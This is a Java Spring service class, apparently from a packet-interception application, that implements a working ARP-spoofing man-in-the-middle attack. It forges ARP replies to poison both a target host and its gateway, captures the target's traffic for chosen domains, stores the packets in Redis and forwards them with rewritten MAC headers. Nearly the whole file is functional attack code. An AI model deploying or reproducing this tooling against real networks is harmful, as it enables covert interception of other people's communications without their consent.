package com.hyc.backend.service;

import com.hyc.backend.dao.RedisMapper;
import com.hyc.pojo.*;
import com.hyc.backend.redis.AttackKey;
import com.hyc.backend.redis.CommonKey;
import com.hyc.utils.NetworkUtils;
import com.hyc.pojo.AttackConfig;
import com.hyc.pojo.CapturedTCPPacket;
import com.hyc.pojo.CapturedUDPPacket;
import com.hyc.utils.NetworkUtils;
import jpcap.JpcapCaptor;
import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.*;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;
import org.springframework.util.StringUtils;

import javax.annotation.PostConstruct;
import javax.annotation.Resource;
import java.io.IOException;
import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.Arrays;
import java.util.Date;
import java.util.Map;
import java.util.Set;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * @author kol Huang
 * @date 2021/3/22
 */
@Service
public class AttackService {
    private static final org.slf4j.Logger logger = LoggerFactory.getLogger(AttackService.class);

    @Resource
    RedisMapper redisMapper;

    @Autowired
    DmIpLookUpService dmIpLookUpService;

    private NetworkInterface[] devices;

    private NetworkInterface mainDevice;

    private String mainDeviceName;

    private AttackConfig config;

    JpcapCaptor captor;
    JpcapSender sender;

    //根据配置获取的地址实体对象
    private InetAddress dstIPIA;
    private byte[] dstMACBT;
    private InetAddress srcIPIA;
    private byte[] srcMACBT;
    private InetAddress gateIPIA;
    private byte[] gateMACBT;

    private boolean attacking = false;

    private Date startAttackTimeStamp;
    private Integer batchId;

    //使用线程池
    private static final int CORE_POOL_SIZE = 5;//核心线程数
    private static final int MAXIMUM_POOL_SIZE = 10;//最大线程数
    private static final long KEEP_ALIVE_TIME = 1L;//空闲保活时间
    private static final TimeUnit UNIT = TimeUnit.MILLISECONDS;//时间单位
    private static final int QUEUE_CAPACITY = 5;//任务队列最大长度
    static ThreadPoolExecutor executor = new ThreadPoolExecutor(
            CORE_POOL_SIZE,
            MAXIMUM_POOL_SIZE,
            KEEP_ALIVE_TIME,
            UNIT,
            new ArrayBlockingQueue<>(QUEUE_CAPACITY),//有界阻塞队列
            new ThreadPoolExecutor.CallerRunsPolicy()//饱和策略选择调用线程帮忙的策略
    );


    private long upStreamNum;
    private long downStreamNum;
    private long upTcpNum;
    private long upUdpNum;
    private long upIcmpNum;
    private long upArpNum;
    private long downTcpNum;
    private long downUdpNum;
    private long downIcmpNum;
    private long downArpNum;

    @PostConstruct
    public void initDefaultConfig(){
        this.initDeviceList();
        AttackConfig config = (AttackConfig) redisMapper.get(AttackKey.config, "config", AttackConfig.class);
        if(config == null){
            String dstIP = "";
            String dstMAC = "";
            String gateIP = "";
            String gateMAC = "";
            String srcIP = null;
            String srcMAC = null;

            //获取本地IP和MAC地址
            Map<String, String> addrs = NetworkUtils.getLocalAddress();
            if(addrs == null){
                addrs = NetworkUtils.getPublicAddress();

            }
            if(addrs != null){
                srcIP = addrs.get("ip");
                srcMAC = addrs.get("mac");
            }else{
                logger.error("can not acquire source IP/MAC address");
            }
            config = new AttackConfig();
            config.setDeviceName(null);
            if(srcMAC != null){
                srcMAC = srcMAC.replace('-', ':').toLowerCase();
            }
            config.setSrcMac(srcMAC);
            config.setSrcIp(srcIP);
            if(StringUtils.hasLength(dstMAC)){
                dstMAC = dstMAC.replace('-', ':').toLowerCase();
            }
            config.setDestMac(dstMAC);
            config.setDestIp(dstIP);
            if(StringUtils.hasLength(gateMAC)){
                gateMAC = gateMAC.replace('-', ':').toLowerCase();
            }
            config.setGateMac(gateMAC);
            config.setGateIp(gateIP);
            redisMapper.set(AttackKey.config, "config", config);
        }

    }
    @PostConstruct
    public void initBatchId(){
        redisMapper.setnx(CommonKey.COMMON_KEY,"batch_id", 0);
    }

    public synchronized void updateConfigAndOpenDevice(AttackConfig config) throws IOException {
        this.mainDeviceName = config.getDeviceName();
        this.config = config;
        openDevice(config.getDeviceName());
        initAddresses();
    }

    /**
     * 枚举网卡
     */
    private void initDeviceList(){
        this.devices = JpcapCaptor.getDeviceList();
        if(this.devices != null && this.devices.length > 0){
            mainDevice = devices[0];
            this.mainDeviceName = mainDevice.name;
        }
    }

    /**
     * 根据传入的设备名参数开启网卡，如果对应名称的设备不存在，那么就使用默认的设备
     * @param deviceName
     */
    private void openDevice(String deviceName) throws IOException {
        this.mainDevice = getDeviceByName(deviceName);
        if(mainDevice == null){
            this.mainDevice = devices[0];
            logger.error("Cannot get device named" + deviceName + ", so use the default device: " + mainDevice.name);
        }
        this.mainDeviceName = mainDevice.name;
        captor = JpcapCaptor.openDevice(mainDevice, 2000, false, 10000);
        //可设置过滤器
        //add Filter here

        sender = captor.getJpcapSenderInstance();//打开网卡设备
    }

    private void initAddresses() throws UnknownHostException {
        dstIPIA = InetAddress.getByName(config.getDestIp());
        dstMACBT = NetworkUtils.stomac(config.getDestMac());
        srcIPIA = InetAddress.getByName(config.getSrcIp());
        srcMACBT = NetworkUtils.stomac(config.getSrcMac());
        gateIPIA = InetAddress.getByName(config.getGateIp());
        gateMACBT = NetworkUtils.stomac(config.getGateMac());
    }

    private NetworkInterface getDeviceByName(String deviceName){
        if(devices == null || !StringUtils.hasLength(deviceName))   return null;
        for (NetworkInterface device : devices) {
            if(deviceName.equals(device.name)){
                return device;
            }
        }
        return null;
    }

    public synchronized void attack(){
        //当前处于攻击状态，说明已经有线程在攻击了，所以当前线程直接返回
        if(attacking)   return;
        attacking = true;

        startAttackTimeStamp = new Date();//记录当前时间
        //为了方便统计数据，我们为每次攻击都设置一个批次ID，即batchId
        //这个batchId需要是自增的，如何获取一个自增的batchId呢？
        //那就还从redis里取呗，但是这个batchId必须跟每次攻击的数据包对应好，否则就乱了
        //OK，那我们就在初始化Servlet的时候，就在Redis里设置一个存id的键，如果不存在，那就创建一个，见方法initBatchId
        batchId = (Integer) redisMapper.get(CommonKey.COMMON_KEY, "batch_id", Integer.class);
        //这里没考虑并发修改redis的batchId的问题，因为同一时间只有一个线程会执行攻击方法
        //因为AttackService默认是单例的，锁上之后，别的线程也没法调用attack方法，也就不会并发修改batchId
        //但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx
        //这里就不实现了
        batchId++;
        //主键自增并放入redis，在并发环境下，这里会存在数据库不一致问题，导致其他进程脏读！
        redisMapper.set(CommonKey.COMMON_KEY, "batch_id", batchId);
        //设置ARP包欺骗目标主机，将自己伪装成网关
        ARPPacket arpToDst = createARPPacket(srcMACBT, gateIPIA.getAddress(), dstMACBT, dstIPIA.getAddress());


        //设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址
        //这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上
        ARPPacket arpToGate = createARPPacket(srcMACBT, dstIPIA.getAddress(), gateMACBT, gateIPIA.getAddress());
        //将域名映射为IP，按批次号存入redis中
        dmIpLookUpService.ipLookUp(batchId,config.getFilterDomain());

        //发包
        sendPacket(arpToDst, arpToGate);
        //收包并转发
        receiveAndForwardingPacket();
    }

    private ARPPacket createARPPacket(byte[] sHardAddr, byte[] sProtoAddr,byte[] tHardAddr, byte[] tProtoAddr){
        ARPPacket arpPacket = new ARPPacket();
        arpPacket.hardtype = ARPPacket.HARDTYPE_ETHER;
        arpPacket.prototype = ARPPacket.PROTOTYPE_IP;
        arpPacket.operation = ARPPacket.ARP_REPLY;//设置操作类型为应答
        arpPacket.hlen = 6;//硬件地址长度
        arpPacket.plen = 4;//协议类型长度
        arpPacket.sender_hardaddr = sHardAddr;//发送端MAC地址
        arpPacket.sender_protoaddr = sProtoAddr;//发送端IP地址
        arpPacket.target_hardaddr = tHardAddr;//目标MAC地址
        arpPacket.target_protoaddr = tProtoAddr;//目标IP地址

        //定义以太网首部
        EthernetPacket ethernetPacket = new EthernetPacket();
        ethernetPacket.frametype = EthernetPacket.ETHERTYPE_ARP;//设置帧类型为ARP帧
        ethernetPacket.src_mac = sHardAddr;//源MAC地址
        ethernetPacket.dst_mac = tHardAddr;//目标MAC地址
        //添加以太网首部
        arpPacket.datalink = ethernetPacket;
        return arpPacket;
    }
    //发送数据包
    private void sendPacket(Packet packet1, Packet packet2){
        Runnable task = new Runnable() {
            @Override
            public void run() {
                while(attacking){
                    try{
                        if(sender != null && attacking){
                            sender.sendPacket(packet1);
                        }
                        if(sender != null && attacking){
                            sender.sendPacket(packet2);
                        }
                        //控制发包的速度
                        Thread.sleep(500);
                    } catch (Throwable e) {
                        logger.error("Unknown error occur in send thread, ", e);
                    }
                }
            }
        };
        executor.execute(task);
    }
    //接收并转发数据包
    private void receiveAndForwardingPacket(){
        Runnable task = new Runnable() {
            @Override
            public void run() {
                while(attacking){
                    try{
                        //接收数据包
                        Packet packet = captor.getPacket();
                        if(packet != null && packet != Packet.EOF){
                            //检查是否是IP包
                            if(packet instanceof IPPacket){
                                IPPacket ipPacket = (IPPacket) packet;
                                //数据包属于filterDomain
                                if(isRelatedToSpecificDomains(ipPacket.src_ip.getHostAddress())
                                        || isRelatedToSpecificDomains(ipPacket.dst_ip.getHostAddress())){
                                    //将数据包转发到目标主机并保存到数据库

                                    //如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包
                                    if(ipPacket.src_ip.getHostAddress().equals(config.getDestIp())){
                                        //如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的数据包，需要忽略
                                        if(ipPacket.datalink instanceof EthernetPacket){
                                            savePacket(ipPacket, true);
                                        }
                                        forward(ipPacket, gateMACBT);
                                    }
                                    //如果这个数据包的目的IP地址是目标主机的IP地址，那么说明是下行链路的数据包
                                    else if(ipPacket.dst_ip.getHostAddress().equals(config.getDestIp())){
                                        savePacket(ipPacket, false);
                                        forward(ipPacket, dstMACBT);
                                    }
                                }
                            }

                            //检查是否是ARP包
                            if(packet instanceof ARPPacket){
                                ARPPacket arpPacket = (ARPPacket) packet;
                                //ARP数据包中采用byte数组存储IP地址，因此需要将其转换为字符串再判断源IP地址和目地IP地址是否与过滤域有关
                                if(isRelatedToSpecificDomains(NetworkUtils.bytesToIp(arpPacket.sender_protoaddr))
                                || isRelatedToSpecificDomains(NetworkUtils.bytesToIp(arpPacket.target_protoaddr))){
                                    //数据包的发送者与目标IP地址相同，说明是上行链路
                                    if(Arrays.equals(arpPacket.sender_protoaddr, dstIPIA.getAddress())){
                                        if(packet.datalink instanceof EthernetPacket){
                                            EthernetPacket eth = (EthernetPacket) packet.datalink;
                                            String macFromCap = eth.getSourceAddress();
                                            //依旧忽略本地发送的数据包
                                            if(!macFromCap.equalsIgnoreCase(config.getSrcMac())){
                                                savePacket(arpPacket, true);
                                            }
                                        }
                                        forward(arpPacket, gateMACBT);
                                    }else if(Arrays.equals(arpPacket.target_protoaddr, dstIPIA.getAddress())){
                                        savePacket(arpPacket, false);
                                        forward(arpPacket, dstMACBT);
                                    }
                                }
                            }
                        }
                    }catch (Throwable e){
                        logger.error("Unknown error in receive thread, ", e);
                    }
                }
            }
        };
        executor.execute(task);
    }

    private boolean isRelatedToSpecificDomains(String ip){
        if(!StringUtils.hasLength(ip))  return false;

        Set<String> validIps = dmIpLookUpService.getAllIps(batchId);

        if(validIps.contains(ip))   return true;

        return false;
    }

    //这个方法写的很烂！！但是因为json序列化问题，不得不这么写！别骂了，我也觉得很恶心！
    private void savePacket(Packet packet, boolean isUpstream){
        //保存数据包到redis
        if(isUpstream){
            upStreamNum++;
        }else{
            downStreamNum++;
        }

        if(packet instanceof TCPPacket){
            CapturedTCPPacket capturedPacket = new CapturedTCPPacket();
            capturedPacket.setPacket(new com.hyc.packet.TCPPacket((TCPPacket) packet));
            capturedPacket.setBatchId(batchId);
            capturedPacket.setCreated(new Date());
            capturedPacket.setUpStream(isUpstream);
            if(isUpstream){
                upTcpNum++;
            }else{
                downTcpNum++;
            }
            //应该在redis中为抓到的每一类数据包都创建一个list，分开存储，这样取的时候可以针对性的取！
            redisMapper.addToList(AttackKey.cap_packet, "batch_id" + batchId + "_TCP_list", capturedPacket);
        }else if(packet instanceof UDPPacket){
            CapturedUDPPacket capturedPacket = new CapturedUDPPacket();
            capturedPacket.setPacket(new com.hyc.packet.UDPPacket((UDPPacket) packet));
            capturedPacket.setBatchId(batchId);
            capturedPacket.setCreated(new Date());
            capturedPacket.setUpStream(isUpstream);
            if(isUpstream){
                upUdpNum++;
            }else{
                downUdpNum++;
            }
            redisMapper.addToList(AttackKey.cap_packet, "batch_id" + batchId + "_UDP_list", capturedPacket);
        }else if(packet instanceof ICMPPacket){
            CapturedICMPPacket capturedPacket = new CapturedICMPPacket();
            capturedPacket.setPacket(new com.hyc.packet.ICMPPacket((ICMPPacket) packet));
            capturedPacket.setBatchId(batchId);
            capturedPacket.setCreated(new Date());
            capturedPacket.setUpStream(isUpstream);
            if(isUpstream){
                upIcmpNum++;
            }else{
                downIcmpNum++;
            }
            redisMapper.addToList(AttackKey.cap_packet, "batch_id" + batchId + "_ICMP_list", capturedPacket);
        }else if(packet instanceof ARPPacket){
            CapturedARPPacket capturedPacket = new CapturedARPPacket();
            capturedPacket.setPacket(new com.hyc.packet.ARPPacket((ARPPacket) packet));
            capturedPacket.setBatchId(batchId);
            capturedPacket.setCreated(new Date());
            capturedPacket.setUpStream(isUpstream);
            if(isUpstream){
                upArpNum++;
            }else{
                downArpNum++;
            }
            redisMapper.addToList(AttackKey.cap_packet, "batch_id" + batchId + "_ARP_list", capturedPacket);
        }
    }

    public Integer stopAttack(){
        attacking = false;
        return batchId;
    }

    /**
     * 修改数据包的以太网首部并转发数据包
     * @param packet
     * @param changeMAC
     */
    private void forward(Packet packet, byte[] changeMAC){
        //TODO 转发数据包
        EthernetPacket eth = null;
        if(packet.datalink instanceof EthernetPacket){
            eth = (EthernetPacket) packet.datalink;
            for(int i = 0; i < 6; ++i){
                //修改包的以太网帧头，改变包的目标
                eth.dst_mac[i] = changeMAC[i];
                //源发送MAC地址改成本地主机
                eth.src_mac[i] = mainDevice.mac_address[i];
            }
            if(sender != null && attacking)
                sender.sendPacket(packet);
        }
    }


    public boolean isAttacking() {
        return attacking;
    }

    public void setAttacking(boolean attacking) {
        this.attacking = attacking;
    }

    public NetworkInterface[] getDevices(){
        return devices;
    }


    public long getUpStreamNum() {
        return upStreamNum;
    }

    public long getDownStreamNum() {
        return downStreamNum;
    }

    public long getUpTcpNum() {
        return upTcpNum;
    }

    public long getUpUdpNum() {
        return upUdpNum;
    }

    public long getUpIcmpNum() {
        return upIcmpNum;
    }

    public long getUpArpNum() {
        return upArpNum;
    }

    public long getDownTcpNum() {
        return downTcpNum;
    }

    public long getDownUdpNum() {
        return downUdpNum;
    }

    public long getDownIcmpNum() {
        return downIcmpNum;
    }

    public long getDownArpNum() {
        return downArpNum;
    }
}
